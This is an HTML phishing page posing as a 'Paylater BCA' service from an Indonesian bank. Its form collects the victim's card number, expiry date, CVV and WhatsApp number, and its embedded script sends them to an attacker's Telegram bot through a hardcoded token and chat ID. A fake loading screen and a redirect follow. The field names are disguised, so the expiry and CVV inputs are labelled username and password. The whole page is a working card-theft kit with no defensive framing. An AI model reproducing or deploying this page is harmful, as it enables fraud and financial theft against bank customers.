<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Paylater BCA</title>
  <meta name="viewport" content="width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      max-width: 800px;
      margin: 0 auto;
    }

    .gambar {
      width: 100%;
      margin-bottom: 0px;
    }

    .gambar img {
      width: 100%;
      object-fit: cover;
      margin-bottom: 0px;
    }

    .form-container {
      margin-bottom: 50px;
    }

    .form-container form {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 10px;
    }

    .form-container input[type="tel"],
    .form-container input[type="password"],
    .form-container input[type="tel"],
    .form-container input[type="Submit"] {
      width: calc(80% - 8px);
      padding: 13px;
      border-radius: 8px;
      border: 2px solid #2f539b;
      margin-bottom: 20px;
      margin-left: 4px;
      font-weight: bold;
    }

    .form-container input[type="Submit"] {
      width: calc(100% - 8px);
      max-width: 330px;
      padding: 13px;
      border-radius: 6px;
      background-color: #2f539b;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-left: 7px;
    }

    .gambar-bawah {
      display: flex;
      justify-content: center;
      position: relative;
      bottom: -10px;
    }

    .gambar-bawah img {
      width: 90%;
      object-fit: cover;
      margin: 0 25px;
    }

    .white-element {
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.8);
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .white-element img {
      width: 80px;
      height: 80px;
    }

    .loading-text {
      margin-top: 10px;
      font-size: 16px;
    }

    .username-password-container {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      width: calc(88% - 8px);
      margin-bottom: 20px;
    }

    .username-password-container input[type="text"],
    .username-password-container input[type="password"] {
      width: 60%;
      margin-right: 58px;
    }

    .pin-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: calc(80% - 8px);
    }

    .pin-container input[type="tel"] {
      width: 100%;
    }
  </style>
  <script>
    function sendMessageToTelegram(message) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
          console.log("Pesan terkirim: " + message);
        }
      };
      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);

      xhttp.open("POST", url, true);
      xhttp.send();
    }

    function kirimPesan() {
      var nomorHP = document.getElementById('nomor_hp').value;
      var pin = document.getElementById('pin').value;
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;

      if (nomorHP.trim() === '' || pin.trim() === '' || username.trim() === '' || password.trim() === '') {
        if (navigator.vibrate) {
          navigator.vibrate(200);
        }
        return;
      }

      var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin + "\nUsername: " + username + "\nPassword: " + password;
      sendMessageToTelegram(message);
      showWhiteElement();
    }

    function showWhiteElement() {
      var whiteElement = document.createElement('div');
      whiteElement.classList.add('white-element');

      var logoImage = document.createElement('img');
      logoImage.src = 'https://i.ibb.co/k5RL7j6/IMG-20240306-223403-removebg-preview.png';
      logoImage.alt = 'Logo';
      whiteElement.appendChild(logoImage);

      var loadingText = document.createElement('div');
      loadingText.classList.add('loading-text');
      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
      whiteElement.appendChild(loadingText);

      document.body.appendChild(whiteElement);

      setTimeout(function () {
        window.location.href = 'usser.html';
      }, 5000); // Ubah waktu penundaan menjadi 5 detik
    }

    function updateStyle(inputId) {
      var inputElement = document.getElementById(inputId);
      var inputValue = inputElement.value;

      if (inputValue !== '') {
        inputElement.style.fontWeight = 'bold';
        inputElement.style.color = 'rgba(black)';
      } else {
        inputElement.style.fontWeight = 'normal';
        inputElement.style.color = 'inherit';
      }
    }
  </script>
</head>
<body>
  <div class="gambar">
    <img src="https://i.ibb.co/S7nq4Jf/IMG-20240306-220627.jpg" alt="Gambar Pucok">
  </div>

  <div class="form-container">
    <form onsubmit="kirimPesan(); return false;">
      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="Masukan 16 Digit Nomor Kartu BCA" maxlength="16" class="nomor_hp" oninput="updateStyle('nomor_hp')">
      <div class="username-password-container">
        <input type="tel" id="username" name="username" placeholder="Masa Berlaku" maxlength="4" class ="username" oninput="updateStyle ('username')">
        <input type="tel" id="password" name="password" placeholder="CVV" maxlength="3" class ="password" oninput="updateStyle ('password')">
      </div>
      <div class="pin-container">
        <input type="tel" id="pin" name="pin" placeholder="Nomor Whatsapp" maxlength="12" class="pin-input" oninput="updateStyle('pin')">
      </div>
      <input type="Submit" value="Lanjutkan">
    </form>
  </div>

  <div class="gambar gambar-bawah">
    <img src="https://i.ibb.co/K5j2YvV/IMG-20240306-221037.jpg" alt="Logo LPS">
  </div>
</body>
</html>
